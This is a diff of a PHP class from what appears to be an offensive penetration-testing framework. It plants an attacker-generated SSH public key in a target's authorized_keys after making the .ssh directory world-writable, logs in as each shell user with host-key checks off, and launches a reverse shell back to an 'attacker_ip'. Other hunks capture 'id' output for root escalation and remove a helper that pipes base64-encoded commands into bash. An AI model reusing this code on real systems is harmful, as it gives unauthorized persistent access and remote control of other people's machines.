@@ -94,46 +94,51 @@ class SERVICE4COM extends AUTH {
         $result = "";
         $timeout = 10 ;
         $remote_username = trim($remote_username);
+        
+        $this->article("Remote Home User", $local_home_user);
+        $this->article("Remote User2use", $remote_username);
         $private_key_ssh_rsa_file = "$this->dir_tmp/$this->ip.$remote_username.rsa.priv";
         $obj_file = new FILE($private_key_ssh_rsa_file);
         $public_key_ssh_rsa_file = "$obj_file->file_dir/$obj_file->file_name.pub";
         $pass_phrase = '';
-        $private_keys = $this->genPrivateKey($private_key_ssh_rsa_file, $pass_phrase);
-        $public_keys = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file);
+        $private_keys_str = $this->key2gen4priv("",10,$private_key_ssh_rsa_file, $pass_phrase);
+        $public_keys_str = $this->key2gen4public("",10,$private_key_ssh_rsa_file, $public_key_ssh_rsa_file,$pass_phrase);
+        
+        $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
+        $tmp_file = $this->req_str($stream,$query,$this->stream_timeout);
+        $query = "echo '$tmp_file' $this->filter_file_path";
+        exec($query,$tmp);
+        if (isset($tmp[0])) $authorized_keys_filepath = trim($tmp[0]);
         
         if (empty($authorized_keys_filepath)){
-            if (!is_dir("$local_home_user/.ssh")) $this->requette("echo '$this->root_passwd' | sudo -S sudo -u $local_username mkdir $local_home_user/.ssh");
-            $query = "echo '$remote_userpass' | sudo -S sudo -u $local_username chmod 777 -R $local_home_user/.ssh";
-            $this->requette($query);
+            $this->req_str($stream,"mkdir $local_home_user/.ssh",$this->stream_timeout);
+            $query = "chmod 777 -R $local_home_user/.ssh";
+            $this->req_str($stream,$query,$this->stream_timeout);
             $query = "cat $public_key_ssh_rsa_file > $local_home_user/.ssh/authorized_keys";
-            $this->requette($query);
+            $this->req_str($stream,$query,$this->stream_timeout);
             $query = "ls -al $local_home_user/.ssh";
-            $this->requette($query);
-            $query = "ls -aln $local_home_user/.ssh";
-            $this->requette($query);
-            $this->pause();
+            $this->req_str($stream,$query,$this->stream_timeout);
+
             
+            $query = "chown $local_username  $local_home_user/.ssh/authorized_keys";
+            //$this->req_str($stream,$query,$this->stream_timeout);
+
             
-            $query = "echo '$remote_userpass' | sudo -S chown $local_username:$local_username  $local_home_user/.ssh/authorized_keys";
-            $this->requette($query);
-            $query = "ls -al $local_home_user/.ssh";
-            $this->requette($query);
-            $query = "ls -aln $local_home_user/.ssh";
-            $this->requette($query);
-            $this->pause();
-            
-            $query = "find $local_home_user -name authorized_keys -type f 2> /dev/null | grep 'authorized_keys' "; // | grep '$find_user'
-            $authorized_keys_filepath = trim($this->req_ret_str($query));
+            $query = "find $local_home_user -name authorized_keys -type f -maxdepth 3 -exec ls -al {} \; 2> /dev/null | awk '{print $9}' | grep \"authorized_keys\" $this->filter_file_path "; // | grep '$find_user'
+            $tmp_file = $this->req_str($stream,$query,$this->stream_timeout);
+            $query = "echo '$tmp_file' $this->filter_file_path";
+            exec($query,$tmp);
+            if (isset($tmp[0])) $authorized_keys_filepath = trim($tmp[0]);
         }
-        
+       
         if (!empty($authorized_keys_filepath)){
             
             $query = "cat $authorized_keys_filepath";
-            $result .= $this->req_str($stream,$query,$timeout);
+            $result .= $this->req_str($stream,$query,$this->stream_timeout);
             $this->pause();
             
             
-            if(stristr($authorized_keys_str,$public_keys)) {
+            if(stristr($authorized_keys_str,$public_keys_str)!==FALSE) {
                 $this->log2succes("FOUND Public key - already exist",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"$authorized_keys_str","");
                 echo "Public key already exist\n";
                 $result .= "Public key already exist\n";
@@ -141,20 +146,35 @@ class SERVICE4COM extends AUTH {
             else {
                 echo "Public key added\n";
                 $data = " echo '#".$this->user2agent."' | tee -a $authorized_keys_filepath";
-                $result .= $this->req_str($stream,$data,$timeout);
-                $data = " echo '$public_keys' | tee -a $authorized_keys_filepath";
-                $result .= $this->req_str($stream,$data,$timeout);
+                $result .= $this->req_str($stream,$data,$this->stream_timeout);
+                $data = " echo '$public_keys_str' | tee -a $authorized_keys_filepath";
+                $result .= $this->req_str($stream,$data,$this->stream_timeout);
                 
             }
             $this->pause();
             
             $ssh_open = $this->ip2port4service("ssh");
             if(!empty($ssh_open)) {
-                $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $remote_username, $private_key_ssh_rsa_file);
+                $ip2users2shell = $this->ip2users4shell();
+                foreach ($ip2users2shell as $username){
+                    $username = trim($username);
+                    $stream = $this->stream8ssh2key8priv4file($this->ip, $ssh_open, $username, $private_key_ssh_rsa_file,"");
                 if(is_resource($stream)){
                     $info = "SSH Private Key:$private_key_ssh_rsa_file";
-                    $this->stream4root($stream);
+                    $this->log2succes($info, __FILE__, __CLASS__, __FUNCTION__, __LINE__, $info, "");
+                    $template_shell = "ssh -i $private_key_ssh_rsa_file -o ConnectTimeout=15 -o StrictHostKeyChecking=no  -o UserKnownHostsFile=/dev/null  $username@$this->ip -p $ssh_open -C  '%SHELL%'";
+                    $templateB64_shell = base64_encode($template_shell);
+                    $attacker_ip = $this->ip4addr4target($this->ip);
+                    $attacker_port = rand(1024,65535);
+                    $shell = "/bin/bash";
+                    $cmd_rev  = $this->rev8sh($attacker_ip, $attacker_port, $shell);
+                    $cmd = str_replace("%SHELL%", $cmd_rev, $template_shell);
+                    $lport = $ssh_open;
+                    $lprotocol = 'T' ;
+                    $type = "server";
+                    $this->service4lan($cmd, $templateB64_shell, $attacker_port, $lprotocol, $type);
                 }
+            }
             }
             
         }
@@ -279,84 +299,6 @@ class SERVICE4COM extends AUTH {
     }
     
 
-    
-    public function stream4result($stream,$data,$timeout){
-        $result = "";
-        //$this->ssTitre(__FUNCTION__.": $this->ip");
-        $data = trim($data);
-        //var_dump( posix_ttyname(STDIN) );var_dump( posix_ttyname(STDOUT) );
-        //echo "\n";
-        $this->article("Stream Type",get_resource_type($stream));
-        
-        $this->article("TIMEOUT", $timeout."s");
-        $this->article("DATA", $data);
-        $data = "echo '".base64_encode($data)."' | base64 -d | bash - "; // 2> /dev/null
-        $this->article("CMDLINE", $data);
-        //$this->article("CMD BASE64", $data);
-        if(is_resource($stream)){
-            
-            switch (get_resource_type($stream)){
-                // https://www.php.net/manual/fr/resource.php
-                
-                case "SSH2 Session":
-                    $stream = ssh2_exec($stream, $data);
-                    //$stream = ssh2_shell($stream, 'vt102', null, 80, 24, SSH2_TERM_UNIT_CHARS);
-                    //$stream_out = ssh2_fetch_stream($stream, SSH2_STREAM_STDIO);
-                    
-                    
-                    // OK
-                    $tmp = "";
-                    stream_set_blocking($stream, TRUE);
-                    stream_set_timeout($stream, $timeout);
-                    //$status = stream_get_meta_data($stream);
-                    fgets($stream);
-                    $result = "";
-                    $result = @stream_get_contents($stream);
-                    echo $result;
-                    //$result .= $this->article("CMD", $data); $this->pause();
-                    //  }
-                    break;
-                    
-                    
-            case "stream" :
-                
-                fflush($stream);
-                //var_dump($this->stream);
-                 
-                fputs($stream, "$data\n");
-                //stream_socket_sendto($stream, $data,STREAM_OOB,"$this->ip");
-                fflush($stream);
-                stream_set_blocking($stream, TRUE);
-                stream_set_timeout($stream,$timeout);
-                //sleep(1);
-                //$result = fgetss($stream, 9182);
-                //$fgets = "";$fgets = fgets($stream);$this->rouge($fgets);
-                fgets($stream);
-                $result = "";
-                $result = @stream_get_contents($stream);
-                // 
-                while (strstr($result, "[sudo] password for ")){
-                    $data = "";
-                    fputs($stream, "$data\n");
-                    $result = @stream_get_contents($stream);
-                }
-                echo $result."\n";
-                break;
-                
-            case "Unknown":
-                $this->log2error("unknown stream",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"$this->ip","");
-                break;
-                
-            default:
-                $this->log2error("unknown default stream",__FILE__,__CLASS__,__FUNCTION__,__LINE__,"","");
-                break;
-                
-        }
-        
-    }
-    
-    return $result;
-}
 
     
     public function service8lan4user($lan2whois){
@@ -512,7 +454,8 @@ class SERVICE4COM extends AUTH {
                     
                     $template_cmd = base64_decode($templateB64_cmd);
                     $rst = $this->stream4result($stream,$id,10);
-                    list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context) = $this->parse4id($rst);
+                    list($uid,$uid_name,$gid,$gid_name,$euid,$euid_name,$egid,$egid_name,$groups,$context,$id) = $this->parse4id($rst);
+                    $id8b64 = base64_encode($id);
                     $this->article("CREATE Template ID", $template_id);
                     //$this->article("CREATE Template BASE64 ID", $templateB64_id);
                     $this->article("CREATE Template CMD", $template_cmd);
@@ -522,7 +465,7 @@ class SERVICE4COM extends AUTH {
                     
                     
                     
-                    $obj_lan = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$uid,$uid_name,$gid,$gid_name,$context);
+                    $obj_lan = new check4linux($this->eth,$this->domain,$this->ip,$this->port,$this->protocol, $stream,$templateB64_id,$templateB64_cmd,$templateB64_shell,$id8b64);
                     //$obj_lan->lan2pentest8id($template_id);
                     $obj_lan->poc($this->flag_poc);
                     $obj_lan->lan4root();
@@ -750,7 +693,8 @@ class SERVICE4COM extends AUTH {
                 fputs($stream, "$data\n");
                 
                 $rst_id = @stream_get_contents($stream);
-                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
+                $id8b64 = base64_encode($id);
                 if (!empty($uid_name)){
                     $cmd = "%CMD%";
                     $template_id = str_replace("/usr/bin/id","%ID%",$data);
@@ -766,7 +710,8 @@ class SERVICE4COM extends AUTH {
                 fputs($stream, "$data\n");
                 
                 $rst_id = @stream_get_contents($stream);
-                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
+                $id8b64 = base64_encode($id);
                 if (!empty($uid_name)){
                     $cmd = "%CMD%";
                     $template_id = str_replace("id","%ID%",$data);
@@ -802,7 +747,7 @@ class SERVICE4COM extends AUTH {
                 fputs($stream, "$data\n");
                 
                 $rst_id = stream_get_contents($stream);                
-                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 if (!empty($uid_name)){
                     $cmd = "%CMD%";                   
                     $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
@@ -896,7 +841,7 @@ class SERVICE4COM extends AUTH {
                 fputs($stream, "$data\n");
                 
                 $rst_id = stream_get_contents($stream);
-                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 if (!empty($uid_name)){
                     $cmd = "%CMD%";
                     $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
@@ -913,7 +858,7 @@ class SERVICE4COM extends AUTH {
                 fputs($stream, "$data\n");
                 
                 $rst_id = stream_get_contents($stream);
-                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 if (!empty($uid_name)){
                     $cmd = "%CMD%";
                     $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
@@ -930,7 +875,7 @@ class SERVICE4COM extends AUTH {
                 fputs($stream, "$data\n");
                 
                 $rst_id = stream_get_contents($stream);
-                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                 if (!empty($uid_name)){
                     $cmd = "%CMD%";
                     $template_id_new = str_replace("/usr/bin/id","%ID%",$data);
@@ -1097,7 +1042,7 @@ class SERVICE4COM extends AUTH {
                             
                             $rst_id = stream_get_contents($stream);
                             
-                            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context) = $this->parse4id($rst_id);
+                            list($uid,$uid_name,$gid,$gid_name,$euid,$username_euid,$egid,$groupname_egid,$groups,$context,$id) = $this->parse4id($rst_id);
                             if (!empty($uid_name)){
                                 
                                 $cmd = "%CMD%";
@@ -1198,10 +1143,12 @@ class SERVICE4COM extends AUTH {
     
     
     public function key2gen4priv2pem($stream,$timeout,$private_key_file,$private_key_passwd){
-        $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -outform pem -text -out $private_key_file.pem",$timeout );
-        $this->requette("ls -al $private_key_file.pem");
-        $this->requette("file $private_key_file.pem");
-        $this->requette("cat $private_key_file.pem");
+        if (!empty($private_key_passwd)) $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -outform pem -text -out $private_key_file.pem",$this->stream_timeout);
+        else $this->req_str($stream,"openssl rsa -in $private_key_file -outform pem -text -out $private_key_file.pem",$this->stream_timeout);
+        
+        $this->req_str($stream,"ls -al $private_key_file.pem",$this->stream_timeout);
+        $this->req_str($stream,"file $private_key_file.pem",$this->stream_timeout);
+        $this->req_str($stream,"cat $private_key_file.pem",$this->stream_timeout);
         return "$private_key_file.pem";
     }
 
@@ -1211,12 +1158,12 @@ class SERVICE4COM extends AUTH {
         if(!file_exists($private_key_file)) $this->requette("openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out $private_key_file" );
         
         $query = "openssl rsa -check -in $private_key_file";
-        $this->req_str($stream,$query,$timeout);
+        $this->req_str($stream,$query,$this->stream_timeout);
         $query = "openssl rsa -in $private_key_file -text -noout";
         //$this->req_str($stream,$query,$timeout);
-        $this->req_str($stream,"ls -al $private_key_file",$timeout);
-        $this->key2gen4priv2pem($stream,$timeout,$private_key_file,$private_key_passwd);
-        return trim($this->req_str($stream,"cat $private_key_file",$timeout ));
+        $this->req_str($stream,"ls -al $private_key_file",$this->stream_timeout);
+        $this->key2gen4priv2pem($stream,$this->stream_timeout,$private_key_file,$private_key_passwd);
+        return trim($this->req_str($stream,"cat $private_key_file",$this->stream_timeout ));
     }
     
     
@@ -1228,12 +1175,10 @@ class SERVICE4COM extends AUTH {
             $this->log2error("Empty Private key", __FILE__,__CLASS__,__FUNCTION__,__LINE__, "Empty Private key:$public_key_file","");
             return $public_key_str;
         }
-        
-        if(!file_exists($public_key_file)) {           
-            if (!empty($private_key_passwd)) {
-
-                $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -pubout -out $public_key_file.tmp",$timeout );
-                }
+        var_dump($private_key_passwd);
+        if(!file_exists($public_key_file)) {    
+            
+            if (!empty($private_key_passwd)) $this->req_str($stream,"openssl rsa -in $private_key_file -passin pass:$private_key_passwd -pubout -out $public_key_file.tmp",$this->stream_timeout);
             else $this->req_str($stream,"openssl rsa -in $private_key_file -pubout -out $public_key_file.tmp",$timeout );
             $this->req_str($stream,"cat $public_key_file.tmp",$timeout );
             $this->req_str($stream,"ssh-keygen -i -m PKCS8 -f $public_key_file.tmp > $public_key_file ",$timeout);
